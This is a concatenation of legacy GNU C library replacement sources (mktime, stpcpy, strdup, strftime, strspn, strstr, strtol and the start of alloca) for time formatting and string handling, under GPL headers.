#ifdef DEBUG

#include <stdio.h>
#include <ctype.h>

int debugging_enabled = 0;

/* Print the values in a `struct tm'. */
static void
printtm (it)
     struct tm *it;
{
  printf ("%02d/%02d/%04d %02d:%02d:%02d (%s) yday:%03d dst:%d gmtoffset:%ld",
	  it->tm_mon + 1,
	  it->tm_mday,
	  it->tm_year + 1900,
	  it->tm_hour,
	  it->tm_min,
	  it->tm_sec,
	  it->tm_zone,
	  it->tm_yday,
	  it->tm_isdst,
	  it->tm_gmtoff);
}
#endif


static time_t
dist_tm (t1, t2)
     struct tm *t1;
     struct tm *t2;
{
  time_t distance = 0;
  unsigned long int v1, v2;
  int diff_flag = 0;

  v1 = v2 = 0;

#define doit(x, secs)                                                         \
  v1 += t1->x * secs;                                                         \
  v2 += t2->x * secs;                                                         \
  if (!diff_flag)                                                             \
    {                                                                         \
      if (t1->x < t2->x)                                                      \
	diff_flag = -1;                                                       \
      else if (t1->x > t2->x)                                                 \
	diff_flag = 1;                                                        \
    }
  
  doit (tm_year, 31536000);	/* Okay, not all years have 365 days. */
  doit (tm_mon, 2592000);	/* Okay, not all months have 30 days. */
  doit (tm_mday, 86400);
  doit (tm_hour, 3600);
  doit (tm_min, 60);
  doit (tm_sec, 1);
  
#undef doit
  
  /* We should also make sure that the sign of DISTANCE is correct -- if
     DIFF_FLAG is positive, the distance should be positive and vice versa. */
  
  distance = (v1 > v2) ? (v1 - v2) : (v2 - v1);
  if (diff_flag < 0)
    distance = -distance;

  if (times_through_search > 20) /* Arbitrary # of calls, but makes sure we
				    never hang if there's a problem with
				    this algorithm.  */
    {
      distance = diff_flag;
    }

  /* We need this DIFF_FLAG business because it is forseeable that the
     distance may be zero when, in actuality, the two structures are
     different.  This is usually the case when the dates are 366 days apart
     and one of the years is a leap year.  */

  if (distance == 0 && diff_flag)
    distance = 86400 * diff_flag;

  return distance;
}
      

/* MKTIME converts the values in a struct tm to a time_t.  The values
   in tm_wday and tm_yday are ignored; other values can be put outside
   of legal ranges since they will be normalized.  This routine takes
   care of that normalization. */

void
do_normalization (tmptr)
     struct tm *tmptr;
{

#define normalize(foo,x,y,bar); \
  while (tmptr->foo < x) \
    { \
      tmptr->bar--; \
      tmptr->foo = (y - (x - tmptr->foo) + 1); \
    } \
  while (tmptr->foo > y) \
    { \
      tmptr->foo = (x + (tmptr->foo - y) - 1); \
      tmptr->bar++; \
    }
  
  normalize (tm_sec, 0, 59, tm_min);
  normalize (tm_min, 0, 59, tm_hour);
  normalize (tm_hour, 0, 23, tm_mday);
  
  /* Do the month first, so day range can be found. */
  normalize (tm_mon, 0, 11, tm_year);

  /* Since the day range modifies the month, we should be careful how
     we reference the array of month lengths -- it is possible that
     the month will go negative, hence the modulo...

     Also, tm_year is the year - 1900, so we have to 1900 to have it
     work correctly. */

  normalize (tm_mday, 1,
	     __mon_lengths[__isleap (tmptr->tm_year + 1900)]
                          [((tmptr->tm_mon < 0)
			    ? (12 + (tmptr->tm_mon % 12))
			    : (tmptr->tm_mon % 12)) ],
	     tm_mon);

  /* Do the month again, because the day may have pushed it out of range. */
  normalize (tm_mon, 0, 11, tm_year);

  /* Do the day again, because the month may have changed the range. */
  normalize (tm_mday, 1,
	     __mon_lengths[__isleap (tmptr->tm_year + 1900)]
	                  [((tmptr->tm_mon < 0)
			    ? (12 + (tmptr->tm_mon % 12))
			    : (tmptr->tm_mon % 12)) ],
	     tm_mon);
  
#ifdef DEBUG
  if (debugging_enabled)
    {
      printf ("   After normalizing:\n     ");
      printtm (tmptr);
      putchar ('\n');
    }
#endif

}


/* Here's where the work gets done. */

#define BAD_STRUCT_TM ((time_t) -1)

time_t
_mktime_internal (timeptr, producer)
     struct tm *timeptr;
     struct tm *(*producer) __P ((const time_t *));
{
  struct tm our_tm;		/* our working space */
  struct tm *me = &our_tm;	/* a pointer to the above */
  time_t result;		/* the value we return */

  *me = *timeptr;		/* copy the struct tm that was passed
				   in by the caller */


  /***************************/
  /* Normalize the structure */
  /***************************/

  /* This routine assumes that the value of TM_ISDST is -1, 0, or 1.
     If the user didn't pass it in that way, fix it. */

  if (me->tm_isdst > 0)
    me->tm_isdst = 1;
  else if (me->tm_isdst < 0)
    me->tm_isdst = -1;

  do_normalization (me);

  /* Get out of here if it's not possible to represent this struct.
     If any of the values in the normalized struct tm are negative,
     our algorithms won't work.  Luckily, we only need to check the
     year at this point; normalization guarantees that all values will
     be in correct ranges EXCEPT the year. */

  if (me->tm_year < 0)
    return BAD_STRUCT_TM;

  /*************************************************/
  /* Find the appropriate time_t for the structure */
  /*************************************************/

  /* Modified b-search -- make intelligent guesses as to where the
     time might lie along the timeline, assuming that our target time
     lies a linear distance (w/o considering time jumps of a
     particular region).

     Assume that time does not fluctuate at all along the timeline --
     e.g., assume that a day will always take 86400 seconds, etc. --
     and come up with a hypothetical value for the time_t
     representation of the struct tm TARGET, in relation to the guess
     variable -- it should be pretty close!

     After testing this, the maximum number of iterations that I had
     on any number that I tried was 3!  Not bad.

     The reason this is not a subroutine is that we will modify some
     fields in the struct tm (yday and mday).  I've never felt good
     about side-effects when writing structured code... */

  {
    struct tm *guess_tm;
    time_t guess = 0;
    time_t distance = 0;
    time_t last_distance = 0;

    times_through_search = 0;

    do
      {
	guess += distance;

	times_through_search++;     
      
	guess_tm = (*producer) (&guess);
      
#ifdef DEBUG
	if (debugging_enabled)
	  {
	    printf ("   Guessing time_t == %d\n     ", (int) guess);
	    printtm (guess_tm);
	    putchar ('\n');
	  }
#endif
      
	/* How far is our guess from the desired struct tm? */
	distance = dist_tm (me, guess_tm);
      
	/* Handle periods of time where a period of time is skipped.
	   For example, 2:15 3 April 1994 does not exist, because DST
	   is in effect.  The distance function will alternately
	   return values of 3600 and -3600, because it doesn't know
	   that the requested time doesn't exist.  In these situations
	   (even if the skip is not exactly an hour) the distances
	   returned will be the same, but alternating in sign.  We
	   want the later time, so check to see that the distance is
	   oscillating and we've chosen the correct of the two
	   possibilities.

	   Useful: 3 Apr 94 765356300, 30 Oct 94 783496000 */

	if ((distance == -last_distance) && (distance < last_distance))
	  {
	    /* If the caller specified that the DST flag was off, it's
               not possible to represent this time. */
	    if (me->tm_isdst == 0)
	      {
#ifdef DEBUG
	    printf ("   Distance is oscillating -- dst flag nixes struct!\n");
#endif
		return BAD_STRUCT_TM;
	      }

#ifdef DEBUG
	    printf ("   Distance is oscillating -- chose the later time.\n");
#endif
	    distance = 0;
	  }

	if ((distance == 0) && (me->tm_isdst != -1)
	    && (me->tm_isdst != guess_tm->tm_isdst))
	  {
	    /* If we're in this code, we've got the right time but the
               wrong daylight savings flag.  We need to move away from
               the time that we have and approach the other time from
               the other direction.  That is, if I've requested the
               non-DST version of a time and I get the DST version
               instead, I want to put us forward in time and search
               backwards to get the other time.  I checked all of the
               configuration files for the tz package -- no entry
               saves more than two hours, so I think we'll be safe by
               moving 24 hours in one direction.  IF THE AMOUNT OF
               TIME SAVED IN THE CONFIGURATION FILES CHANGES, THIS
               VALUE MAY NEED TO BE ADJUSTED.  Luckily, we can never
               have more than one level of overlaps, or this would
               never work. */

#define SKIP_VALUE 86400

	    if (guess_tm->tm_isdst == 0)
	      /* we got the later one, but want the earlier one */
	      distance = -SKIP_VALUE;
	    else
	      distance = SKIP_VALUE;
	    
#ifdef DEBUG
	    printf ("   Got the right time, wrong DST value -- adjusting\n");
#endif
	  }

	last_distance = distance;

      } while (distance != 0);

    /* Check to see that the dst flag matches */

    if (me->tm_isdst != -1)
      {
	if (me->tm_isdst != guess_tm->tm_isdst)
	  {
#ifdef DEBUG
	    printf ("   DST flag doesn't match!  FIXME?\n");
#endif
	    return BAD_STRUCT_TM;
	  }
      }

    result = guess;		/* Success! */

    /* On successful completion, the values of tm_wday and tm_yday
       have to be set appropriately. */
    
    /* me->tm_yday = guess_tm->tm_yday; 
       me->tm_mday = guess_tm->tm_mday; */

    *me = *guess_tm;
  }

  /* Update the caller's version of the structure */

  *timeptr = *me;

  return result;
}

time_t
#ifdef DEBUG			/* make it work even if the system's
				   libc has it's own mktime routine */
my_mktime (timeptr)
#else
mktime (timeptr)
#endif
     struct tm *timeptr;
{
  return _mktime_internal (timeptr, localtime);
}

#ifdef DEBUG
void
main (argc, argv)
     int argc;
     char *argv[];
{
  int time;
  int result_time;
  struct tm *tmptr;
  
  if (argc == 1)
    {
      long q;
      
      printf ("starting long test...\n");

      for (q = 10000000; q < 1000000000; q += 599)
	{
	  struct tm *tm = localtime ((time_t *) &q);
	  if ((q % 10000) == 0) { printf ("%ld\n", q); fflush (stdout); }
	  if (q != my_mktime (tm))
	    { printf ("failed for %ld\n", q); fflush (stdout); }
	}
      
      printf ("test finished\n");

      exit (0);
    }
  
  if (argc != 2)
    {
      printf ("wrong # of args\n");
      exit (0);
    }
  
  debugging_enabled = 1;	/* We want to see the info */

  ++argv;
  time = atoi (*argv);
  
  tmptr = localtime ((time_t *) &time);
  printf ("Localtime tells us that a time_t of %d represents\n     ", time);
  printtm (tmptr);
  putchar ('\n');

  printf ("   Given localtime's return val, mktime returns %d which is\n     ",
	  (int) my_mktime (tmptr));
  printtm (tmptr);
  putchar ('\n');

#if 0
  tmptr->tm_sec -= 20;
  tmptr->tm_min -= 20;
  tmptr->tm_hour -= 20;
  tmptr->tm_mday -= 20;
  tmptr->tm_mon -= 20;
  tmptr->tm_year -= 20;
  tmptr->tm_gmtoff -= 20000;	/* This has no effect! */
  tmptr->tm_zone = NULL;	/* Nor does this! */
  tmptr->tm_isdst = -1;
#endif
  
  tmptr->tm_hour += 1;
  tmptr->tm_isdst = -1;

  printf ("\n\nchanged ranges: ");
  printtm (tmptr);
  putchar ('\n');

  result_time = my_mktime (tmptr);
  printf ("\nmktime: %d\n", result_time);

  tmptr->tm_isdst = 0;

  printf ("\n\nchanged ranges: ");
  printtm (tmptr);
  putchar ('\n');

  result_time = my_mktime (tmptr);
  printf ("\nmktime: %d\n", result_time);
}
#endif /* DEBUG */


/*
Local Variables:
compile-command: "gcc -g mktime.c -o mktime -DDEBUG"
End:
*/
/* stpcpy.c -- copy a string and return pointer to end of new string
    Copyright (C) 1989, 1990 Free Software Foundation.

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2, or (at your option)
    any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA. */

#ifdef HAVE_CONFIG_H
#include <config.h>
#endif

/* Copy SRC to DEST, returning the address of the terminating '\0' in DEST.  */

char *
stpcpy (dest, src)
     char *dest;
     const char *src;
{
  while ((*dest++ = *src++) != '\0')
    /* Do nothing. */ ;
  return dest - 1;
}
/* strdup.c -- return a newly allocated copy of a string
   Copyright (C) 1990 Free Software Foundation, Inc.

   This program is free software; you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation; either version 2, or (at your option)
   any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program; if not, write to the Free Software
   Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.  */

#ifdef HAVE_CONFIG_H
#include <config.h>
#endif

#ifdef STDC_HEADERS
#include <string.h>
#include <stdlib.h>
#else
char *malloc ();
char *strcpy ();
#endif

/* Return a newly allocated copy of STR,
   or 0 if out of memory. */

char *
strdup (str)
     const char *str;
{
  char *newstr;

  newstr = (char *) malloc (strlen (str) + 1);
  if (newstr)
    strcpy (newstr, str);
  return newstr;
}
/* strftime - custom formatting of date and/or time
   Copyright (C) 1989, 1991, 1992 Free Software Foundation, Inc.

   This program is free software; you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation; either version 2, or (at your option)
   any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program; if not, write to the Free Software
   Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.  */

/* Note: this version of strftime lacks locale support,
   but it is standalone.

   Performs `%' substitutions similar to those in printf.  Except
   where noted, substituted fields have a fixed size; numeric fields are
   padded if necessary.  Padding is with zeros by default; for fields
   that display a single number, padding can be changed or inhibited by
   following the `%' with one of the modifiers described below.  Unknown
   field specifiers are copied as normal characters.  All other
   characters are copied to the output without change.

   Supports a superset of the ANSI C field specifiers.

   Literal character fields:
   %	%
   n	newline
   t	tab

   Numeric modifiers (a nonstandard extension):
   -	do not pad the field
   _	pad the field with spaces

   Time fields:
   %H	hour (00..23)
   %I	hour (01..12)
   %k	hour ( 0..23)
   %l	hour ( 1..12)
   %M	minute (00..59)
   %p	locale's AM or PM
   %r	time, 12-hour (hh:mm:ss [AP]M)
   %R	time, 24-hour (hh:mm)
   %s	time in seconds since 00:00:00, Jan 1, 1970 (a nonstandard extension)
   %S	second (00..61)
   %T	time, 24-hour (hh:mm:ss)
   %X	locale's time representation (%H:%M:%S)
   %Z	time zone (EDT), or nothing if no time zone is determinable

   Date fields:
   %a	locale's abbreviated weekday name (Sun..Sat)
   %A	locale's full weekday name, variable length (Sunday..Saturday)
   %b	locale's abbreviated month name (Jan..Dec)
   %B	locale's full month name, variable length (January..December)
   %c	locale's date and time (Sat Nov 04 12:02:33 EST 1989)
   %C	century (00..99)
   %d	day of month (01..31)
   %e	day of month ( 1..31)
   %D	date (mm/dd/yy)
   %h	same as %b
   %j	day of year (001..366)
   %m	month (01..12)
   %U	week number of year with Sunday as first day of week (00..53)
   %w	day of week (0..6)
   %W	week number of year with Monday as first day of week (00..53)
   %x	locale's date representation (mm/dd/yy)
   %y	last two digits of year (00..99)
   %Y	year (1970...)

   David MacKenzie <djm@gnu.ai.mit.edu> */

#ifdef HAVE_CONFIG_H
#include <config.h>
#endif

#include <stdio.h>
#include <sys/types.h>
#if defined(TM_IN_SYS_TIME) || (!defined(HAVE_TM_ZONE) && !defined(HAVE_TZNAME))
#include <sys/time.h>
#else
#include <time.h>
#endif

#ifndef STDC_HEADERS
time_t mktime ();
#endif

#if defined(HAVE_TZNAME)
extern char *tzname[2];
#endif

/* Types of padding for numbers in date and time. */
enum padding
{
  none, blank, zero
};

static char const* const days[] =
{
  "Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday"
};

static char const * const months[] =
{
  "January", "February", "March", "April", "May", "June",
  "July", "August", "September", "October", "November", "December"
};

/* Add character C to STRING and increment LENGTH,
   unless LENGTH would exceed MAX. */

#define add_char(c)							\
  do									\
    {									\
      if (length + 1 <= max)						\
	string[length++] = (c);						\
    }									\
  while (0)

/* Add a 2 digit number to STRING, padding if specified.
   Return the number of characters added, up to MAX. */

static int
add_num2 (string, num, max, pad)
     char *string;
     int num;
     int max;
     enum padding pad;
{
  int top = num / 10;
  int length = 0;

  if (top == 0 && pad == blank)
    add_char (' ');
  else if (top != 0 || pad == zero)
    add_char (top + '0');
  add_char (num % 10 + '0');
  return length;
}

/* Add a 3 digit number to STRING, padding if specified.
   Return the number of characters added, up to MAX. */

static int
add_num3 (string, num, max, pad)
     char *string;
     int num;
     int max;
     enum padding pad;
{
  int top = num / 100;
  int mid = (num - top * 100) / 10;
  int length = 0;

  if (top == 0 && pad == blank)
    add_char (' ');
  else if (top != 0 || pad == zero)
    add_char (top + '0');
  if (mid == 0 && top == 0 && pad == blank)
    add_char (' ');
  else if (mid != 0 || top != 0 || pad == zero)
    add_char (mid + '0');
  add_char (num % 10 + '0');
  return length;
}

/* Like strncpy except return the number of characters copied. */

static int
add_str (to, from, max)
     char *to;
     const char *from;
     int max;
{
  int i;

  for (i = 0; from[i] && i <= max; ++i)
    to[i] = from[i];
  return i;
}

static int
add_num_time_t (string, max, num)
     char *string;
     int max;
     time_t num;
{
  /* This buffer is large enough to hold the character representation
     (including the trailing NUL) of any unsigned decimal quantity
     whose binary representation fits in 128 bits.  */
  char buf[40];
  int length;

  if (sizeof (num) > 16)
    abort ();
  sprintf (buf, "%lu", (unsigned long) num);
  length = add_str (string, buf, max);
  return length;
}

/* Return the week in the year of the time in TM, with the weeks
   starting on Sundays. */

static int
sun_week (tm)
     struct tm *tm;
{
  int dl;

  /* Set `dl' to the day in the year of the last day of the week previous
     to the one containing the day specified in TM.  If the day specified
     in TM is in the first week of the year, `dl' will be negative or 0.
     Otherwise, calculate the number of complete weeks before our week
     (dl / 7) and add any partial week at the start of the year (dl % 7). */
  dl = tm->tm_yday - tm->tm_wday;
  return dl <= 0 ? 0 : dl / 7 + (dl % 7 != 0);
}

/* Return the week in the year of the time in TM, with the weeks
   starting on Mondays. */

static int
mon_week (tm)
     struct tm *tm;
{
  int dl, wday;

  if (tm->tm_wday == 0)
    wday = 6;
  else
    wday = tm->tm_wday - 1;
  dl = tm->tm_yday - wday;
  return dl <= 0 ? 0 : dl / 7 + (dl % 7 != 0);
}

#if !defined(HAVE_TM_ZONE) && !defined(HAVE_TZNAME)
char *
zone_name (tp)
     struct tm *tp;
{
  char *timezone ();
  struct timeval tv;
  struct timezone tz;

  gettimeofday (&tv, &tz);
  return timezone (tz.tz_minuteswest, tp->tm_isdst);
}
#endif

/* Format the time given in TM according to FORMAT, and put the
   results in STRING.
   Return the number of characters (not including terminating null)
   that were put into STRING, or 0 if the length would have
   exceeded MAX. */

size_t
strftime (string, max, format, tm)
     char *string;
     size_t max;
     const char *format;
     const struct tm *tm;
{
  enum padding pad;		/* Type of padding to apply. */
  size_t length = 0;		/* Characters put in STRING so far. */

  for (; *format && length < max; ++format)
    {
      if (*format != '%')
	add_char (*format);
      else
	{
	  ++format;
	  /* Modifiers: */
	  if (*format == '-')
	    {
	      pad = none;
	      ++format;
	    }
	  else if (*format == '_')
	    {
	      pad = blank;
	      ++format;
	    }
	  else
	    pad = zero;

	  switch (*format)
	    {
	      /* Literal character fields: */
	    case 0:
	    case '%':
	      add_char ('%');
	      break;
	    case 'n':
	      add_char ('\n');
	      break;
	    case 't':
	      add_char ('\t');
	      break;
	    default:
	      add_char (*format);
	      break;

	      /* Time fields: */
	    case 'H':
	    case 'k':
	      length +=
		add_num2 (&string[length], tm->tm_hour, max - length,
			  *format == 'H' ? pad : blank);
	      break;
	    case 'I':
	    case 'l':
	      {
		int hour12;

		if (tm->tm_hour == 0)
		  hour12 = 12;
		else if (tm->tm_hour > 12)
		  hour12 = tm->tm_hour - 12;
		else
		  hour12 = tm->tm_hour;
		length +=
		  add_num2 (&string[length], hour12, max - length,
			    *format == 'I' ? pad : blank);
	      }
	      break;
	    case 'M':
	      length +=
		add_num2 (&string[length], tm->tm_min, max - length, pad);
	      break;
	    case 'p':
	      if (tm->tm_hour < 12)
		add_char ('A');
	      else
		add_char ('P');
	      add_char ('M');
	      break;
	    case 'r':
	      length +=
		strftime (&string[length], max - length, "%I:%M:%S %p", tm);
	      break;
	    case 'R':
	      length +=
		strftime (&string[length], max - length, "%H:%M", tm);
	      break;

	    case 's':
	      {
		struct tm writable_tm;
		writable_tm = *tm;
		length += add_num_time_t (&string[length], max - length,
					  mktime (&writable_tm));
	      }
	      break;

	    case 'S':
	      length +=
		add_num2 (&string[length], tm->tm_sec, max - length, pad);
	      break;
	    case 'T':
	      length +=
		strftime (&string[length], max - length, "%H:%M:%S", tm);
	      break;
	    case 'X':
	      length +=
		strftime (&string[length], max - length, "%H:%M:%S", tm);
	      break;
	    case 'Z':
#ifdef HAVE_TM_ZONE
	      length += add_str (&string[length], tm->tm_zone, max - length);
#else
#ifdef HAVE_TZNAME
	      if (tm->tm_isdst && tzname[1] && *tzname[1])
		length += add_str (&string[length], tzname[1], max - length);
	      else
		length += add_str (&string[length], tzname[0], max - length);
#else
	      length += add_str (&string[length], zone_name (tm), max - length);
#endif
#endif
	      break;

	      /* Date fields: */
	    case 'a':
	      add_char (days[tm->tm_wday][0]);
	      add_char (days[tm->tm_wday][1]);
	      add_char (days[tm->tm_wday][2]);
	      break;
	    case 'A':
	      length +=
		add_str (&string[length], days[tm->tm_wday], max - length);
	      break;
	    case 'b':
	    case 'h':
	      add_char (months[tm->tm_mon][0]);
	      add_char (months[tm->tm_mon][1]);
	      add_char (months[tm->tm_mon][2]);
	      break;
	    case 'B':
	      length +=
		add_str (&string[length], months[tm->tm_mon], max - length);
	      break;
	    case 'c':
	      length +=
		strftime (&string[length], max - length,
			  "%a %b %d %H:%M:%S %Z %Y", tm);
	      break;
	    case 'C':
	      length +=
		add_num2 (&string[length], (tm->tm_year + 1900) / 100,
			  max - length, pad);
	      break;
	    case 'd':
	      length +=
		add_num2 (&string[length], tm->tm_mday, max - length, pad);
	      break;
	    case 'e':
	      length +=
		add_num2 (&string[length], tm->tm_mday, max - length, blank);
	      break;
	    case 'D':
	      length +=
		strftime (&string[length], max - length, "%m/%d/%y", tm);
	      break;
	    case 'j':
	      length +=
		add_num3 (&string[length], tm->tm_yday + 1, max - length, pad);
	      break;
	    case 'm':
	      length +=
		add_num2 (&string[length], tm->tm_mon + 1, max - length, pad);
	      break;
	    case 'U':
	      length +=
		add_num2 (&string[length], sun_week (tm), max - length, pad);
	      break;
	    case 'w':
	      add_char (tm->tm_wday + '0');
	      break;
	    case 'W':
	      length +=
		add_num2 (&string[length], mon_week (tm), max - length, pad);
	      break;
	    case 'x':
	      length +=
		strftime (&string[length], max - length, "%m/%d/%y", tm);
	      break;
	    case 'y':
	      length +=
		add_num2 (&string[length], tm->tm_year % 100,
			  max - length, pad);
	      break;
	    case 'Y':
	      add_char ((tm->tm_year + 1900) / 1000 + '0');
	      length +=
		add_num3 (&string[length],
			  (1900 + tm->tm_year) % 1000, max - length, zero);
	      break;
	    }
	}
    }
  add_char (0);
  return length - 1;
}
/* strspn.c -- return numbers of chars at start of string in a class
   Copyright (C) 1987, 1990 Free Software Foundation, Inc.

   This program is free software; you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation; either version 2, or (at your option)
   any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program; if not, write to the Free Software
   Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.  */

#ifdef HAVE_CONFIG_H
#include <config.h>
#endif

#if defined(HAVE_STRING_H)
#include <string.h>
#else
#include <strings.h>
#ifndef strchr
#define strchr index
#endif
#endif

int
strspn (str, class)
     char *str, *class;
{
  register char *st = str;

  while (*st && strchr (class, *st))
    ++st;
  return st - str;
}
/* strstr.c -- return the offset of one string within another
   Copyright (C) 1989, 1990 Free Software Foundation, Inc.

   This program is free software; you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation; either version 2, or (at your option)
   any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program; if not, write to the Free Software
   Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.  */

/* Written by Mike Rendell <michael@cs.mun.ca>.  */

/* Return the starting address of string S2 in S1;
   return 0 if it is not found. */

char *
strstr (s1, s2)
     char *s1;
     char *s2;
{
  int i;
  char *p1;
  char *p2;
  char *s = s1;

  for (p2 = s2, i = 0; *s; p2 = s2, i++, s++)
    {
      for (p1 = s; *p1 && *p2 && *p1 == *p2; p1++, p2++)
	;
      if (!*p2)
	break;
    }
  if (!*p2)
    return s1 + i;

  return 0;
}
/* Copyright (C) 1991, 1992 Free Software Foundation, Inc.

   This program is free software; you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation; either version 2, or (at your option)
   any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program; if not, write to the Free Software
   Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.  */

#ifdef HAVE_CONFIG_H
#include <config.h>
#endif

#include <ctype.h>
#include <errno.h>

#if HAVE_LIMITS_H
#include <limits.h>
#endif

#ifndef ULONG_MAX
#define ULONG_MAX ((unsigned long) ~(unsigned long) 0)
#endif

#ifndef LONG_MAX
#define	LONG_MAX (~(1 << (sizeof (long) * 8 - 1)))
#endif

#ifndef LONG_MIN
#define LONG_MIN (-LONG_MAX - 1)
#endif

#if STDC_HEADERS
#include <stddef.h>
#include <stdlib.h>
#else
#define NULL 0
extern int errno;
#endif

#ifndef	UNSIGNED
#define	UNSIGNED	0
#endif

/* Convert NPTR to an `unsigned long int' or `long int' in base BASE.
   If BASE is 0 the base is determined by the presence of a leading
   zero, indicating octal or a leading "0x" or "0X", indicating hexadecimal.
   If BASE is < 2 or > 36, it is reset to 10.
   If ENDPTR is not NULL, a pointer to the character after the last
   one converted is stored in *ENDPTR.  */
#if	UNSIGNED
unsigned long int
#define	strtol	strtoul
#else
long int
#endif
strtol (nptr, endptr, base)
     const char *nptr;
     char **endptr;
     int base;
{
  int negative;
  register unsigned long int cutoff;
  register unsigned int cutlim;
  register unsigned long int i;
  register const char *s;
  register unsigned char c;
  const char *save;
  int overflow;

  if (base < 0 || base == 1 || base > 36)
    base = 10;

  s = nptr;

  /* Skip white space.  */
  while (isspace (*s))
    ++s;
  if (*s == '\0')
    goto noconv;

  /* Check for a sign.  */
  if (*s == '-')
    {
      negative = 1;
      ++s;
    }
  else if (*s == '+')
    {
      negative = 0;
      ++s;
    }
  else
    negative = 0;

  if (base == 16 && s[0] == '0' && toupper (s[1]) == 'X')
    s += 2;

  /* If BASE is zero, figure it out ourselves.  */
  if (base == 0)
    {
      if (*s == '0')
	{
	  if (toupper (s[1]) == 'X')
	    {
	      s += 2;
	      base = 16;
	    }
	  else
	    base = 8;
	}
      else
	base = 10;
    }

  /* Save the pointer so we can check later if anything happened.  */
  save = s;

  cutoff = ULONG_MAX / (unsigned long int) base;
  cutlim = ULONG_MAX % (unsigned long int) base;

  overflow = 0;
  i = 0;
  for (c = *s; c != '\0'; c = *++s)
    {
      if (isdigit (c))
	c -= '0';
      else if (isalpha (c))
	c = toupper (c) - 'A' + 10;
      else
	break;
      if (c >= base)
	break;
      /* Check for overflow.  */
      if (i > cutoff || (i == cutoff && c > cutlim))
	overflow = 1;
      else
	{
	  i *= (unsigned long int) base;
	  i += c;
	}
    }

  /* Check if anything actually happened.  */
  if (s == save)
    goto noconv;

  /* Store in ENDPTR the address of one character
     past the last character we converted.  */
  if (endptr != NULL)
    *endptr = (char *) s;

#if	!UNSIGNED
  /* Check for a value that is within the range of
     `unsigned long int', but outside the range of `long int'.  */
  if (i > (negative ?
	   -(unsigned long int) LONG_MIN : (unsigned long int) LONG_MAX))
    overflow = 1;
#endif

  if (overflow)
    {
      errno = ERANGE;
#if	UNSIGNED
      return ULONG_MAX;
#else
      return negative ? LONG_MIN : LONG_MAX;
#endif
    }

  /* Return the result of the appropriate sign.  */
  return (negative ? -i : i);

noconv:;
  /* There was no number to convert.  */
  if (endptr != NULL)
    *endptr = (char *) nptr;
  return 0L;
}
/* alloca.c -- allocate automatically reclaimed memory
   (Mostly) portable public-domain implementation -- D A Gwyn

   This implementation of the PWB library alloca function,
   which is used to allocate space off the run-time stack so
   that it is automatically reclaimed upon procedure exit,
   was inspired by discussions with J. Q. Johnson of Cornell.
   J.Otto Tennant <jot@cray.com> contributed the Cray support.

   There are some preprocessor constants that can
   be defined when compiling for your specific system, for
   improved efficiency; however, the defaults should be okay.

   The general concept of this implementation is to keep
   track of all alloca-allocated blocks, and reclaim any
   that are found to be deeper in the stack than the current
   invocation.  This heuristic does not reclaim storage as
   soon as it becomes invalid, but it will do so eventually.

   As a special case, alloca(0) reclaims storage without
   allocating any.  It is a good idea to use alloca(0) in
   your main control loop, etc. to force garbage collection.  */

#ifdef HAVE_CONFIG_H
#include <config.h>
#endif

#ifdef emacs
#include "blockinput.h"
#endif

/* If compiling with GCC 2, this file's not needed.  */
#if !defined (__GNUC__) || __GNUC__ < 2

/* If someone has defined alloca as a macro,
   there must be some other way alloca is supposed to work.  */
#ifndef alloca

#ifdef emacs
#ifdef static
/* actually, only want this if static is defined as ""
   -- this is for usg, in which emacs must undefine static
   in order to make unexec workable
   */
#ifndef STACK_DIRECTION
you
lose
-- must know STACK_DIRECTION at compile-time
#endif /* STACK_DIRECTION undefined */
#endif /* static */
#endif /* emacs */

/* If your stack is a linked list of frames, you have to
   provide an "address metric" ADDRESS_FUNCTION macro.  */

#if defined (CRAY) && defined (CRAY_STACKSEG_END)
long i00afunc ();
#define ADDRESS_FUNCTION(arg) (char *) i00afunc (&(arg))
#else
#define ADDRESS_FUNCTION(arg) &(arg)
#endif

#if __STDC__
typedef void *pointer;
#else
typedef char *pointer;
#endif

#define	NULL	0

/* Different portions of Emacs need to call different versions of
   malloc.  The Emacs executable needs alloca to call xmalloc, because
   ordinary malloc isn't protected from input signals.  On the other
   hand, the utilities in lib-src need alloca to call malloc; some of
   them are very simple, and don't have an xmalloc routine.

   Non-Emacs programs expect this to call use xmalloc.

   Callers below should use malloc.  */

#ifndef emacs
#define malloc xmalloc
#endif
